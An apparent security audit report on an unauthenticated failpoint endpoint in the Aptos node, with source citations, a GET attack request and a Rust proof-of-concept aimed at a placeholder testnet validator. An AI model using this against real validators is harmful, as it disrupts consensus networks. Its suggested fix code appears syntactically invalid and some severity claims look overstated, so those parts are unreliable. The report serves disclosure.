# Audit Report

## Title
Unauthenticated Failpoint Endpoint Exposure in Production Code Enables Consensus Disruption

## Summary
The `/v1/set_failpoint` endpoint is registered in production code without authentication, allowing unprivileged attackers to inject critical consensus failures on misconfigured validator nodes. While the endpoint requires specific configuration to activate, it lacks authentication controls and can be exploited to create invalid votes, prevent message broadcasts, and disrupt AptosBFT consensus when enabled on testnet/devnet nodes.

## Finding Description

The security question asks whether test infrastructure at lines 356-372 can leak to production. **Those specific lines are NOT vulnerable** - they are within a `#[cfg(test)]` block and cannot be compiled into production binaries. [1](#0-0) 

However, investigation reveals a related vulnerability: the `/v1/set_failpoint` endpoint **IS** exposed in production code without authentication: [2](#0-1) 

This endpoint is registered unconditionally in the production `attach_poem_to_runtime` function. The handler implementation checks configuration but has no authentication: [3](#0-2) 

When enabled, attackers can inject critical consensus failpoints. The most severe example creates votes with dummy BLS signatures: [4](#0-3) 

Additional consensus disruption failpoints include:
- Preventing all consensus message broadcasts [5](#0-4) 

- Blocking vote broadcasts [6](#0-5) 

- Injecting proposal processing failures [7](#0-6) 

**Activation Requirements:**
1. Binary compiled with `--features failpoints` (not default)
2. Config setting `api.failpoints_enabled: true` (defaults to false)
3. Either non-mainnet OR `skip_config_sanitizer: true` [8](#0-7) [9](#0-8) 

**Config Sanitizer Protection:**
The sanitizer prevents failpoints on mainnet but can be bypassed: [10](#0-9) [11](#0-10) 

**Attack Scenario:**
1. Operator deploys testnet validator with failpoints enabled for debugging
2. Attacker discovers node via port scanning
3. Attacker calls: `GET /v1/set_failpoint?name=consensus::create_invalid_vote&actions=return`
4. Validator creates votes with invalid BLS signatures
5. Invalid votes propagate to other validators
6. Consensus disrupted, violating BFT safety properties

## Impact Explanation

**Testnet/Devnet: HIGH Severity**
- Operators legitimately enable failpoints for debugging/testing
- No authentication allows any network attacker to exploit endpoint
- Can cause consensus liveness failures (validator slowdowns)
- Can create invalid votes breaking BFT safety assumptions
- Meets **High Severity** criteria: "Validator node slowdowns" and "Significant protocol violations"

**Mainnet: LOW-MEDIUM Severity**
- Protected by config sanitizer
- Requires explicit bypass via `skip_config_sanitizer: true`
- Unlikely but possible through operator error
- If exploited, would be **Critical Severity** (Consensus/Safety violations)

## Likelihood Explanation

**Testnet/Devnet: MEDIUM**
- Operators may enable failpoints for legitimate debugging purposes
- Common practice during development/testing phases
- Endpoint has no authentication barrier
- Attacker only needs network access to API port

**Mainnet: LOW**
- Multiple protections must be bypassed
- Requires intentional misconfiguration
- Config sanitizer enforces policy
- Would require operator explicitly setting `skip_config_sanitizer: true`

## Recommendation

**1. Add Authentication to Failpoint Endpoint**
Require authentication token or admin credentials to access failpoint functionality.

**2. Disable Endpoint Registration When Feature Disabled**
Only register the endpoint route when failpoints feature is enabled at compile time:

```rust
.nest(
    "/v1",
    Route::new()
        .nest("/", api_service)
        .at("/spec.json", poem::get(spec_json))
        .at("/spec.yaml", poem::get(spec_yaml))
        // Only register failpoint endpoint if feature enabled
        #[cfg(feature = "failpoints")]
        .at(
            "/set_failpoint",
            poem::get(set_failpoints::set_failpoint_poem)
                .data(context.clone())
                .with(AuthenticationMiddleware), // Add auth
        ),
)
```

**3. Add Explicit Warning**
Log prominent warning when failpoints are enabled on node startup.

**4. Remove Skip Sanitizer Bypass**
Consider removing or restricting the `skip_config_sanitizer` option to prevent accidental bypass of mainnet protections.

## Proof of Concept

```rust
// PoC: Exploit failpoint endpoint on misconfigured validator
// Compile aptos-node with: cargo build --features failpoints
// Configure node with: api.failpoints_enabled = true

use reqwest::blocking::Client;

fn exploit_validator(target_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::new();
    
    // Inject failpoint to create invalid votes
    let response = client
        .get(&format!("{}/v1/set_failpoint", target_url))
        .query(&[
            ("name", "consensus::create_invalid_vote"),
            ("actions", "return"),
        ])
        .send()?;
    
    println!("Failpoint injection status: {}", response.status());
    println!("Response: {}", response.text()?);
    
    // Validator will now create votes with dummy BLS signatures
    // This violates consensus safety and disrupts the network
    
    Ok(())
}

fn main() {
    // Target a testnet validator with failpoints enabled
    if let Err(e) = exploit_validator("http://testnet-validator.example.com:8080") {
        eprintln!("Exploit failed: {}", e);
    }
}
```

**Notes:**
- The specific lines 356-372 mentioned in the security question are test-only and not vulnerable
- The actual vulnerability is the unauthenticated failpoint endpoint registered at line 249 in production code
- This endpoint is test infrastructure that should not be accessible without authentication
- The issue violates **Consensus Safety** (invariant #2) by allowing creation of invalid cryptographic signatures
- Operators enabling failpoints for debugging inadvertently expose a critical attack vector

### Citations

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/runtime.rs (L298-316)
```rust
#[cfg(test)]
mod tests {
    use super::bootstrap;
    use crate::runtime::get_max_runtime_workers;
    use aptos_api_test_context::{new_test_context, TestContext};
    use aptos_config::config::{ApiConfig, NodeConfig};
    use aptos_types::chain_id::ChainId;
    use std::time::Duration;

    // TODO: Unignore this when I figure out why this only works when being
    // run alone (it fails when run with other tests).
    // https://github.com/aptos-labs/aptos-core/issues/2977
    #[ignore]
    #[test]
    fn test_bootstrap_jsonprc_and_api_configured_at_different_port() {
        let mut cfg = NodeConfig::default();
        cfg.randomize_ports();
        bootstrap_with_config(cfg);
    }
```

**File:** api/src/set_failpoints.rs (L21-40)
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** consensus/src/round_manager.rs (L727-729)
```rust
        fail_point!("consensus::process_proposal_msg", |_| {
            Err(anyhow::anyhow!("Injected error in process_proposal_msg"))
        });
```

**File:** consensus/src/round_manager.rs (L1369-1378)
```rust
        fail_point!("consensus::create_invalid_vote", |_| {
            use aptos_crypto::bls12381;
            let faulty_vote = Vote::new_with_signature(
                vote.vote_data().clone(),
                vote.author(),
                vote.ledger_info().clone(),
                bls12381::Signature::dummy_signature(),
            );
            Ok(faulty_vote)
        });
```

**File:** consensus/src/network.rs (L412-412)
```rust
        fail_point!("consensus::send::any", |_| ());
```

**File:** consensus/src/network.rs (L479-479)
```rust
        fail_point!("consensus::send::vote", |_| ());
```

**File:** aptos-node/Cargo.toml (L95-95)
```text
failpoints = ["fail/failpoints", "aptos-consensus/failpoints", "aptos-executor/failpoints", "aptos-mempool/failpoints", "aptos-api/failpoints", "aptos-config/failpoints"]
```

**File:** config/src/config/api_config.rs (L122-122)
```rust
            failpoints_enabled: default_disabled(),
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```

**File:** config/src/config/config_sanitizer.rs (L46-48)
```rust
        if node_config.node_startup.skip_config_sanitizer {
            return Ok(());
        }
```
